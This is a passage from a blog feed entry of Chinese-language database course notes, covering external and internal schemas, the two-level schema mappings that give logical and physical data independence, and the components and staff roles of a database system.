&lt;h4 id=&#34;2-外模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-外模式&#34;&gt;#&lt;/a&gt; 2、外模式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;外模式也叫做子模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库用户的数据视图，是与某一应用有关的数据的逻辑表示&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外模式的地位：介于模式与应用之间&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模式与外模式的关系：一对多&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;外模式是模式的子集，一个数据库可以有多个外模式反应了不同的用户的应用需求、看待数据的方式、对数据保密的要求&lt;/p&gt;
&lt;p&gt;对模式中同一数据，在外模式中的结构、类型、长度、保密级别等都可以不同&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外模式与应用的关系：一对多&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同一外模式也可以为某一用户的多个应用系统所使用&lt;br /&gt;
但一个应用程序只能使用一个外模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外模式的用途&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保证数据库安全性的一个有力措施&lt;/li&gt;
&lt;li&gt;每个用户只能看见和访问所对应的外模式中的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;外模式是从模式导出的一个子集，包含模式中允许特定用户使用的那部分数据。用户可以通过外模式描述语言来描述、定义对应于用户的数据记录 (外模式)，也可以利用数据操纵语言 (DML) 对这些数据记录进行。外模式反映了数据库的用户观。&lt;/p&gt;
&lt;h4 id=&#34;3-内模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-内模式&#34;&gt;#&lt;/a&gt; 3、内模式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;内模式也称为储存模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;是数据物理结构和储存方式的描述&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;是数据在数据库内部的表示方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;记录的存储方式（顺序存储，按照 B 树结构存储，按 hash 方法存储）&lt;/li&gt;
&lt;li&gt;索引的组织方式&lt;/li&gt;
&lt;li&gt;数据是否压缩存储&lt;/li&gt;
&lt;li&gt;数据是否加密&lt;/li&gt;
&lt;li&gt;数据存储记录结构的规定&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个数据库只有一个内模式&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;133数据库的二级映像域数据独立性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#133数据库的二级映像域数据独立性&#34;&gt;#&lt;/a&gt; 1.3.3 数据库的二级映像域数据独立性&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;三级模式是对数据的三个抽象级别&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二级映象在 DBMS 内部实现这三个抽象层次的联系和转换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;外模式／模式映像&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模式／内模式映像&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;外模式模式映像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#外模式模式映像&#34;&gt;#&lt;/a&gt; 外模式／模式映像&lt;/h4&gt;
&lt;p&gt;保证数据的逻辑独立性:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当模式改变时，数据库管理员修改有关的外模式 / 模式映象，使外模式保持不变&lt;/li&gt;
&lt;li&gt;应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;模式内模式映像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模式内模式映像&#34;&gt;#&lt;/a&gt; 模式／内模式映像&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;模式／内模式映象定义了数据全局逻辑结构与存储结构之间的对应关系。&lt;/li&gt;
&lt;li&gt;数据库中模式／内模式映象是唯一的&lt;/li&gt;
&lt;li&gt;该映象定义通常包含在模式描述中&lt;/li&gt;
&lt;li&gt;保证数据的物理独立性
&lt;ul&gt;
&lt;li&gt;当数据库的存储结构改变了（例如选用了另一种存储结构），数据库管理员修改模式／内模式映象，使模式保持不变&lt;/li&gt;
&lt;li&gt;应用程序不受影响。保证了数据与程序的物理独立性，简称数据的物理独立性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据库的二级映像
&lt;ul&gt;
&lt;li&gt;保证了数据库外模式的稳定性&lt;/li&gt;
&lt;li&gt;从底层保证了应用程序的稳定性，除非应用需求本身发生变化，否则应用程序一般不需要修改&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据与程序之间的独立性，使得数据的定义和描述可以从应用程序中分离出去&lt;/li&gt;
&lt;li&gt;数据的存取由 DBMS 管理
&lt;ul&gt;
&lt;li&gt;用户不必考虑存取路径等细节&lt;/li&gt;
&lt;li&gt;简化了应用程序的编制&lt;/li&gt;
&lt;li&gt;大大减少了应用程序的维护和修改&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;14数据库系统的组成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#14数据库系统的组成&#34;&gt;#&lt;/a&gt; 1.4 数据库系统的组成&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;数据库&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库管理系统（及其开发工具）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库管理员&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;硬件平台及数据库&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;足够大的内存 --- 操作系统、DBMS 的核心模块 、数据缓冲区、 应用程序&lt;/li&gt;
&lt;li&gt;足够大的外存 ----- 磁盘或磁盘阵列（数据库）、光盘、磁带（数据备份）&lt;/li&gt;
&lt;li&gt;较高的通道能力，提高数据传送率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;软件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DBMS&lt;/li&gt;
&lt;li&gt;支持 DBMS 运行的操作系统&lt;/li&gt;
&lt;li&gt;与数据库接口的高级语言及其编译系统&lt;/li&gt;
&lt;li&gt;以 DBMS 为核心的应用开发工具&lt;/li&gt;
&lt;li&gt;为特定应用环境开发的数据库应用系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;人员&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库管理员&lt;/p&gt;
&lt;p&gt;1. 决定数据库中的信息内容和结构&lt;br /&gt;
 2. 决定数据库的存储结构和存取策略&lt;br /&gt;
 3. 定义数据的安全性要求和完整性约束条件&lt;br /&gt;
 4. 监控数据库的使用和运行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;周期性转储数据库&lt;/li&gt;
&lt;li&gt;系统故障恢复&lt;/li&gt;
&lt;li&gt;介质故障恢复&lt;/li&gt;
&lt;li&gt;监视审计文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5. 数据库的改进和重组&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;性能监控和调优&lt;/li&gt;
&lt;li&gt;定期对数据库进行重组织，以提高系统的性能&lt;/li&gt;
&lt;li&gt;需求增加和改变时，数据库须需要重构造&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统分析员和数据库设计人员&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统分析员&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;负责应用系统的需求分析和规范说明&lt;/li&gt;
&lt;li&gt;与用户及 DBA 协商，确定系统的硬软件配置&lt;/li&gt;
&lt;li&gt;参与数据库系统的概要设计&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;数据库设计人员
&lt;ol&gt;
&lt;li&gt;参加用户需求调查和系统分析&lt;/li&gt;
&lt;li&gt;确定数据库中的数据&lt;/li&gt;
&lt;li&gt;设计数据库各级模式&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用程序员&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设计和编写应用系统的程序模块&lt;/li&gt;
&lt;li&gt;进行调试和安装&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;偶然用户&lt;/li&gt;
&lt;li&gt;简单用户&lt;/li&gt;
&lt;li&gt;复杂用户&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
</feed>
